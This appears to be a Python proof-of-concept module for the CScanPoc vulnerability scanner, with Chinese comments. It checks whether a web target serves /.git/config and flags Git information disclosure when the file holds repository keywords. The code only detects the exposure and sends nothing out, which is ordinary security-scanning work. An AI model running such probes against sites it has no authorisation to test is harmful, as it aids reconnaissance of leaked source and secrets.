# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Git_0001'  # 平台漏洞编号，留空
    name = 'Git information disclosure'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        use git incorrect cause site information disclosure。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Git'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c5ce7a4e-bc7e-4541-8faa-5fbdce14abec'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        flag = False
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            keyword = ['core', 'remote', 'branch']
            vul_url = self.target + '/.git/config'

            resquest = urllib.request.Request(vul_url)
            response = urllib.request.urlopen(resquest)
            content = str(response.read())

            for word in keyword:
                if word in content:
                    flag = True
                    break
            if flag == True:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
